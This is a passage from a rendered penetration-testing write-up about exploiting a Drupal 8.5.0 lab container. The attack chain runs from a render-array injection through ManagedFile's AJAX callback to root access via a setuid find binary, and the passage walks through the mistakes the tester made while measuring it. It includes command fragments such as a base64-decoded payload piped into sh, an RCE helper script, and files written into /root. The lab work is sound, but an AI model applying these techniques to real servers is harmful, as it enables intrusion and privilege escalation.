+<p>It is the <strong>only</strong> non-stock file in <code>/root</code> on the build date
+(<code>find /root -maxdepth 1 -type f -newermt 2024-10-16 ! -newermt 2024-10-17</code> → 1 hit). The file itself
+is mode 644; what protects it is the <code>drwx------</code> on <code>/root</code>, which is why the escalation is a real
+step and not a misread mode. The reward is a functional secret, <strong>not</strong> a <code>FLAG{}</code>, and it is
+reported as what the platform gave rather than reshaped into a format it did not use.</p>
+<hr />
+<h2 id="10-what-the-difficulty-actually-consisted-of">10. What the difficulty actually consisted of</h2>
+<p>Number of hops is not difficulty; this lab has three and none of them is a credential. Measured:</p>
+<ol>
+<li><strong>The version is the whole question, and it is one file.</strong> <code>8.5.0</code> versus <code>8.5.1</code> is one file and
+one call. Everything else — the WordPress-shaped question &quot;which extension is vulnerable?&quot;, the
+Joomla-shaped question &quot;read <code>Version.php</code> twice&quot; — is the wrong question for this platform. The
+right one is <em>which <code>8.x.y</code> is this, and what did the next <code>8.x.y</code> change?</em>, and
+<code>GET /drupal/jsonapi</code> → 404 is a reminder that the same version question also decides which
+surfaces <strong>exist</strong> rather than which are <strong>open</strong>.</li>
+<li><strong>The interesting file is the one that does not exist.</strong> <code>RequestSanitizer.php</code> is 99 lines and it
+is the entire fix. I found it by grepping for a <em>class</em> I expected to be there, got 0, and that
+zero is the finding. A tester who greps for the vulnerability rather than for the control has to
+go to the project's git history to learn what the control is called.</li>
+<li><strong>The sink is 15 lines inside a file about uploading images.</strong>
+<code>ManagedFile::uploadAjaxCallback()</code> is a legitimate AJAX callback; its first two lines take a
+caller-supplied path into a data structure. The <code>#</code>-prefix convention that makes this dangerous is
+not a bug in Drupal — it is Drupal's render system working as designed, and the design assumes
+the input never contained <code>#</code>.</li>
+<li><strong>The escalation is a file mode, and <code>dpkg -V</code> says nothing is wrong.</strong> Fourteen setuid binaries,
+thirteen of them stock, and the odd one out is provably a post-install <code>chmod u+s</code> on a binary whose
+md5 still matches the package manifest. <strong>The distro's own integrity checker is blind to modes</strong>,
+so &quot;the package verifies&quot; is not &quot;the file is as the package shipped it&quot;.</li>
+<li><strong>The catalogue's &quot;two distinct paths&quot; is precise, and it is about <em>what each grant can do</em>, not
+about how many there are.</strong> <code>ls</code> reveals names, <code>grep</code> reveals contents; the second is the reward
+and the first is not. An operator who reads the grant as &quot;one rule, delete one program&quot; closes
+nothing.</li>
+<li><strong>What would have burned the budget:</strong> hunting a contrib module (there are none), reading plugin
+PHP (there is no plugin tree), trusting the <code>Generator</code> header (it says <code>8</code>), trusting
+<code>files/.htaccess</code> (it is not the boundary), trusting the <code>/tmp/.htaccess</code> (it guards nothing),
+trusting <code>dpkg -V</code> (it checks md5, not modes), and reading <code>apache2.conf</code>'s <code>AllowOverride None</code>
+as the deployed value — <strong>the last one is the near-miss, and it is §11.6 below.</strong></li>
+</ol>
+<blockquote>
+<p><strong>The one-sentence statement of the difficulty: the previous forty-nine engagements taught me to
+read the <em>sink</em> first, and on this platform the sink is selected by a query-string parameter, so
+every instinct trained on &quot;grep the application code for the vulnerable function&quot; pointed at
+<code>ManagedFile.php</code> for the wrong reason — the function is fine; the path into it is not.</strong></p>
+</blockquote>
+<hr />
+<h2 id="11-instrumentation-defects">11. Instrumentation defects</h2>
+<p>Six. None is a defect in the target; all six are defects in how I measured it, and <strong>two of them
+would have inverted a finding.</strong></p>
+<h3 id="111-the-wrong-file-and-it-would-have-inverted-f3-into-a-critical">11.1 The wrong file, and it would have inverted F3 into a Critical</h3>
+<p>I read <code>/etc/apache2/apache2.conf:170-174</code> — <code>&lt;Directory /var/www/&gt; AllowOverride None</code> — and
+concluded that <strong>the entire Drupal subdirectory PHP boundary was void</strong>, because <code>.htaccess</code> cannot
+speak under <code>AllowOverride None</code>. I had the mechanism, the quote and the severity, and the site kept
+returning 403 for my PHP file, which I was about to file as <em>my probe was wrong</em>.</p>
+<p>It was not my probe. <code>grep -rn '&lt;Directory' /etc/apache2/</code> finds a <strong>second</strong> block, in
+<code>/etc/apache2/conf-enabled/docker-php.conf:8-11</code>, with <code>AllowOverride All</code>, included <strong>later</strong>
+(<code>apache2.conf:222</code>) and therefore winning. Both files ship in the same official
+<code>php:7.2.3-apache</code> image, they contradict each other, and <strong>the one I read is not the one in effect.</strong></p>
+<p><strong>The tell was structural, not numerical.</strong> A 403 with <strong>no error-log line</strong> cannot be produced by a
+broken directive — a <code>SetHandler</code> to a non-existent handler, a <code>php_flag</code> in the wrong scope, a
+missing module, all of them log. Silence plus a 403 means an <em>authorisation</em> decision, and the
+authorisation directives in the whole server config are exactly three blocks. I had the answer in the
+error log two commands away and reached for a conclusion instead.</p>
+<p><strong>This is §11 with a new costume, and the generalisation is worth stating: <em>before recording a
+configuration finding, enumerate every file that can set the directive, and prove which one is
+last-loaded.</em></strong> A duplicated directive across two files in the same config tree is not a rare
+accident; in a base image that vendors both Apache and PHP it is the default. The number of
+<code>AllowOverride</code> directives in this image is <strong>2</strong>, and I had read <strong>1</strong>.</p>
+<h3 id="112-the-first-three-states-of-my-own-differential-never-fired">11.2 The first three states of my own differential never fired</h3>
+<pre><code>$ docker exec --user www-data … printf … &gt; /var/www/html/drupal/sites/default/files/.htaccess
+sh: 1: cannot create /var/www/html/drupal/sites/default/files/.htaccess: Permission denied
+  b) only the &lt;IfModule mod_php5.c&gt; guard         403 326
+  c) only the SetHandler catch-all                  403 326
+  d) .htaccess deleted                              403 326
+</code></pre>
+<p>Three states, three identical 403s, and a <code>Permission denied</code> that scrolled past unexamined — the
+file is <code>root</code>-owned mode <strong>444</strong>. <strong>All three &quot;results&quot; were the unchanged shipped state</strong>, which is
+the corpus's §11/§12 shape exactly: a command that succeeded while doing nothing, manufacturing a
+negative that confirmed what I hoped. It was caught only because states b–d were <em>supposed</em> to
+differ and a 7-state differential with three identical rows is a result about the search.</p>
+<p>Re-run with the privileged write inside the <code>setuid find</code> hop, the same three states produced three
+<em>different</em> answers, and the real differential appeared.</p>
+<h3 id="113--and--are-html-escaped-before-they-reach-sh--a-live-instance-of-15">11.3 <code>&amp;</code> and <code>&gt;</code> are HTML-escaped before they reach <code>sh</code> — a live instance of §15</h3>
+<pre><code>$ # payload:  printf &quot;%s|&quot; &quot;A&gt;B&amp;C&lt;D&gt;E&quot;
+$ # response:  A&amp;gt;B&amp;amp;CE
+</code></pre>
+<p>One layer of escaping, applied to the injected string, measurably: <code>&gt;</code> → <code>&amp;gt;</code>, <code>&amp;</code> → <code>&amp;amp;</code>.
+<code>2&gt;&amp;1</code> becomes <code>2&amp;gt;&amp;1</code>, which <code>sh</code> parses as &quot;background <code>2</code>, then run <code>gt</code>, then <code>1</code>&quot; — the merge
+silently disappears. A <code>&gt;</code> redirect becomes <code>&amp;gt;</code>, so the command is backgrounded and the output
+lands on stdout instead of the file.</p>
+<p><strong>This cost me six commands that I each read, in turn, as &quot;the target refused&quot;.</strong> The tell is in the
+corpus already: lab 189 measured <code>htmlspecialchars</code> turning <code>&amp;</code> into <code>&amp;amp;</code> and reading the result as
+a filter blocking the input, with the control and the negative differing by <strong>one character</strong>. Mine
+differed by one character too — I just took longer to see it, because here the failure mode is
+<em>plausible</em> rather than <em>absurd</em>: a backgrounded command whose output you can still read looks like
+a command that ran.</p>
+<p>The fix is not clever, it is mechanical: <strong>base64 the payload and decode it inside the target</strong>
+(<code>echo &lt;b64&gt; | base64 -d | sh</code>), because no shell metacharacter ever crosses the escaping layer. I
+should have reached for that after the first occurrence instead of the sixth.</p>
+<h3 id="114-passthru-captures-stdout-only-and-i-read-empty-as-denied">11.4 <code>passthru</code> captures stdout only, and I read &quot;empty&quot; as &quot;denied&quot;</h3>
+<pre><code>$ # payload:  ls -la /root/          as www-data
+$ # response: (nothing)
+$ # payload:  id ; echo A ; echo B   as www-data
+$ # response: uid=33(www-data) ... / A / B        &lt;- all three, fine
+</code></pre>
+<p><code>ls -la /root/</code> as <code>www-data</code> writes <code>Permission denied</code> to <strong>stderr</strong>, which <code>passthru</code> does not
+capture, so the response body was empty. For several minutes I read that as <em>the setuid vector did
+not work</em>, because the neighbouring <code>id</code> command's output came back fine. It is the corpus's §14 in
+a new place: <strong>a tool that captured nothing and a tool that found nothing are byte-identical, and
+only the work count distinguishes them</strong> — here the work count is &quot;0 bytes of stderr&quot;, and I had no
+way to see stderr at all until I discovered the <code>&amp;</code> problem in 11.3. The two defects fed each other:
+the escaping bug stopped me merging stderr, and the missing stderr is what made the escaping bug
+look like a refusal.</p>
+<h3 id="115-errorlog-is-a-symlink-to-devstderr-so-tail-on-it-hangs-forever">11.5 <code>error.log</code> is a symlink to <code>/dev/stderr</code>, so <code>tail</code> on it hangs forever</h3>
+<pre><code>$ docker exec ejotapete_container tail -20 /var/log/apache2/error.log
+  sl ...
+$ ls -la /var/log/apache2/
+lrwxrwxrwx 1 root root 11 access.log -&gt; /dev/stdout
+lrwxrwxrwx 1 root root 11 error.log -&gt; /dev/stderr
+</code></pre>
+<p><code>tail</code> on <code>/dev/stderr</code> blocks on a stream that never closes, and burned a 120-second tool timeout
+before I looked at the symlink. The corpus's §7 applies with the emphasis inverted: the
+<code>docker logs</code> <strong>wrapper</strong> is a filter and can summarise, so the fix is <em>both</em> &quot;read the raw stream&quot;
+and &quot;use <code>PATH=/usr/bin:/bin</code> when you do&quot;. Every error-log quotation in this writeup — the
+<code>authz_core:error … AH01630</code> line in C8, the <code>FormAjaxResponseBuilder.php:67</code> message in §7 — came
+from the raw stream, and <strong>all three 403s that mattered had log lines except the one that mattered
+most</strong> (11.1), which is precisely why that one needed a structural argument instead.</p>
+<h3 id="116-my-first-oracle-contained-my-own-workstations-identity">11.6 My first oracle contained my own workstation's identity</h3>
+<pre><code>$ cat &gt; oracle_src.sh &lt;&lt;EOF        # unquoted heredoc
+  id &gt; /root/$S-root
+  grep -E &quot;^(Uid|Gid)&quot; /proc/self/status &gt;&gt; /root/$S-root
+  ls -la /root/ &gt;&gt; /root/$S-root
+EOF                                # $(...) is NOT quoted, so the HOST expanded it
+$ ./rce.sh oracle_src.sh
+/bin/bash
+1000
+[operator-account]                            # &lt;- the operator's shell, not the target's
+</code></pre>
+<p>The oracle file was created correctly (<code>-rw-r--r-- 1 root www-data 24</code>) and its <em>contents</em> were my
+<strong>workstation's</strong> <code>id</code>, expanded at heredoc-construction time and base64'd into the payload. A root
+oracle containing <code>1000 [operator-account]</code> — in a writeup about a container with exactly one non-system
+account, <code>ballenita</code> — is the kind of artefact that survives review, because the file exists, the
+mode is right, and the owner is <code>root</code>. It was caught by reading the file's contents rather than its
+<code>ls</code> line, which is the same discipline as reading the one <code>flag{</code> hit in §9 instead of reporting
+it.</p>
+<p>The generalisation: <strong>an oracle is a payload, and a payload built by string interpolation is a payload
+that can interpolate the wrong machine.</strong> Quote the heredoc, or generate the marker inside the
+target, and then read the marker back.</p>
+<h3 id="117-two-smaller-ones-recorded-because-they-shaped-conclusions">11.7 Two smaller ones, recorded because they shaped conclusions</h3>
+<ul>
+<li><strong><code>dpkg -V findutils</code> reports a pristine tree while <code>/usr/bin/find</code> is mode 4755</strong> (§4.4). I had
+used <code>dpkg -V</code> as the &quot;is this stock?&quot; check and it agreed with me. It verifies <code>md5sums</code>, not
+modes. An absence from a verifier is not an absence of the property — the same sentence as §14,
+applied to a package manager.</li>
+<li><strong>The first <code>POST</code> to <code>/drupal/user/register</code> used <code>mail[0][value]</code> and was rejected with
+<code>Username field is required.</code></strong> I had guessed the input names from another Drupal form. Reading the
+rendered form (<code>name=&quot;name&quot;</code>, <code>name=&quot;mail&quot;</code>, no <code>[]</code>) fixed it in one command. The guess cost two
+submissions, and both of them would have been perfectly good-looking evidence of &quot;registration is
+closed&quot; if I had stopped there — <strong>a wrong input name produces the same &quot;denied&quot; answer as a right
+input name on a closed form.</strong> The control that saved it was submitting a form I had <em>read</em>.</li>
+</ul>
+<hr />
+<h2 id="12-restore">12. Restore</h2>
+<p>Recreated from the image, not by undoing edits, and verified <strong>positively</strong>:</p>
+<pre><code>$ docker rm -f ejotapete_container &amp;&amp; docker run -d --name ejotapete_container ejotapete:latest
+  IP                    -&gt; [net-0-7]
+  front page            -&gt; 200
+  X-Generator           -&gt; X-Generator: Drupal 8 (https://www.drupal.org)
+  version               -&gt; 8.5.0
+  .ht.sqlite size       -&gt; 6230016        (pre-engagement size; it grows with normal use)
+  /root                 -&gt; secretitomaximo.txt
+  my lab82 artefacts    -&gt; 0              (find over /var/www/html and /tmp)
+  users in the store    -&gt; 2              (uid 0 anonymous + uid 1 ballenita; uid 2 gone)
+</code></pre>
+<p><code>/tmp</code> contains exactly the shipped <code>.htaccess</code>; no <code>.saved</code>, no <code>lab82_*</code>, no <code>/root/LAB82-*</code>. The
+<code>user_register_form</code> account I created during the F6 measurement is gone, because the restore is a
+recreation rather than a revert. No archive or image from other principals was touched.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
